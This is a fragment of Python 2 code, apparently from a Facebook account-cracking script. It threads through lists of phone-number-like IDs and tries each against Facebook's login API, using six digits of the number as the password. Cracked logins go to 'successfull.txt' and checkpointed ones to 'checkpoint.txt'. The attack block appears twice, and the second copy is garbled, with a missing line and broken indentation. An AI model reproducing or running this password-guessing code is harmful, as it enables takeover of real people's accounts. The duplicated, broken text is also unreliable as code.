    time.sleep(0.5)
    print
    50 * '-'
    print
 
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
 
        try:
            result = k + c + user
            digi6 = result[8:14]
            pass1 = digi6
            wifi = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(wifi)
            if 'access_token' in q:
                print '\x1b[1;92m[Rakib-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Rakib-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass
 
    p = ThreadPool(30)
    p.map(main, id)
    print
    50 * '-'
    print
    print
    '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 NASIR.py')
 
     time.sleep(0.5)
    print
    50 * '-'
    print
 
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
 
        try:
            result = k + c + user
            digi6 = result[8:14]
            pass1 = digi6
            wifi = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            if 'access_token' in q:
                print '\x1b[1;92m[Rakib-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Rakib-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass
 
    p = ThreadPool(30)
    p.map(main, id)
    print
    50 * '-'
    print
    print
    '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 NASIR.py')
 
 